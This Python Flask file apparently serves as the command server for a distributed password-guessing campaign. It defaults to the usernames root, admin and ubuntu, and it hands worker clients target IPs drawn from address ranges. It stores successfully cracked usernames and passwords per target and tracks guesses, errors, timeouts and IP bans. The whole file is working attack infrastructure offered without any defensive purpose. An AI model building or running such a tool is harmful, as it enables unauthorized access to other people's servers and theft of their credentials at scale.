import logging
import json
from flask import Flask, request, jsonify, abort
from typing import Dict, List, Optional

app = Flask(__name__)

# Global variables
CREDS: Dict[str, Dict[str, str]] = {}
USERS: List[str] = ["root", "admin", "ubuntu"]
NOT_PASSWORD: List[str] = []
RANGE_ID: int = 0
RANGES: List[str] = []
IPS: List[str] = []
TIMEOUT: List[str] = []
BAN: List[str] = []

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


def save_data():
    """Save the current state to 'info.json'."""
    data = {
        "CREDS": CREDS, "USERS": USERS, "RANGE_ID": RANGE_ID,
        "NOT_PASSWORD": NOT_PASSWORD, "RANGES": RANGES,
        "IPS": IPS, "TIMEOUT": TIMEOUT, "BAN": BAN
    }
    with open("info.json", "w") as f:
        json.dump(data, f, indent=4)


def load_data():
    """Load the state from 'info.json'."""
    global CREDS, USERS, RANGE_ID, NOT_PASSWORD, RANGES, IPS, TIMEOUT, BAN
    try:
        with open("info.json", "r") as f:
            data = json.load(f)
        CREDS = data.get("CREDS", {})
        USERS = data.get("USERS", ["root", "admin", "ubuntu"])
        RANGE_ID = data.get("RANGE_ID", 0)
        NOT_PASSWORD = data.get("NOT_PASSWORD", [])
        RANGES = data.get("RANGES", [])
        IPS = data.get("IPS", [])
        TIMEOUT = data.get("TIMEOUT", [])
        BAN = data.get("BAN", [])
    except FileNotFoundError:
        logging.warning("info.json not found. Using default values.")
    except json.JSONDecodeError as e:
        logging.error(f"Error decoding JSON from file: {e}")


@app.route("/target", methods=["GET"])
def get_next_target():
    """Get the next target IP from the range."""
    global RANGE_ID
    current_ip = get_first_ip()
    next_ip = get_next_ip(current_ip)
    while next_ip in IPS:
        next_ip = get_next_ip(current_ip)

    if next_ip == "No more targets.":
        return jsonify({"message": "No more targets."}), 404

    IPS.append(next_ip)
    save_data()
    return jsonify({"target_ip": next_ip})


@app.route("/error", methods=["POST"])
def receive_error():
    """Receive and log errors."""
    data = request.get_json()
    if not all(k in data for k in ("target_ip", "username", "guess", "error")):
        abort(400, description="Missing fields in request.")

    with open("errors.log", "a") as f:
        log_entry = {"target_ip": data["target_ip"], "username": data["username"],
                     "guess": data["guess"], "error": data["error"]}
        f.write(json.dumps(log_entry) + "\n")
    logging.info(f"Error received: {log_entry}")
    return jsonify({"status": "success"})


@app.route("/result", methods=["POST"])
def receive_result():
    """Receive and store successful login results."""
    data = request.get_json()
    if not all(k in data for k in ("target_ip", "success", "username", "password")):
        abort(400, description="Missing fields in request.")
    
    if data["success"]:
        CREDS[data["target_ip"]] = {"password": data["password"], "username": data["username"]}

    return jsonify({"message": "Result received successfully."})


@app.route("/timeout", methods=["POST"])
def receive_timeout():
    """Receive and log timeout events."""
    data = request.get_json()
    if "target_ip" not in data:
        abort(400, description="Missing target_ip field in request.")
    
    TIMEOUT.append(data["target_ip"])
    logging.info(f"Timeout received for IP: {data['target_ip']}")
    return jsonify({"message": "Timeout received successfully."})


@app.route("/ban", methods=["POST"])
def receive_ban():
    """Receive and log banned IPs."""
    data = request.get_json()
    if "target_ip" not in data:
        abort(400, description="Missing target_ip field in request.")
    
    BAN.append(data["target_ip"])
    logging.info(f"Ban received for IP: {data['target_ip']}")
    return jsonify({"message": "Ban received successfully."})


def get_first_ip() -> str:
    """Get the starting IP of the current range."""
    global RANGE_ID
    if not RANGES:
        return "No ranges defined."

    ip_start, _ = RANGES[RANGE_ID].split("-")
    return ip_start.strip()


def get_next_ip(current_ip: str) -> str:
    """Get the next IP address in the range."""
    global RANGE_ID
    if not RANGES:
        return "No ranges defined."

    ip_start, ip_end = RANGES[RANGE_ID].split("-")
    ip_start = tuple(map(int, ip_start.strip().split(".")))
    ip_end = tuple(map(int, ip_end.strip().split(".")))

    current_ip = tuple(map(int, current_ip.split(".")))

    def increment_ip(ip):
        ip = list(ip)
        for i in range(3, -1, -1):
            if ip[i] < 255:
                ip[i] += 1
                break
            ip[i] = 0
        return tuple(ip)

    if ip_start <= current_ip <= ip_end:
        next_ip = increment_ip(current_ip)
        while next_ip <= ip_end:
            next_ip_str = ".".join(map(str, next_ip))
            if next_ip_str not in IPS:
                return next_ip_str
            next_ip = increment_ip(next_ip)
        RANGE_ID += 1
        save_data()
        return get_next_ip(current_ip)
    else:
        return "No more targets."


if __name__ == "__main__":
    load_data()
    app.run(host="0.0.0.0", port=5000)
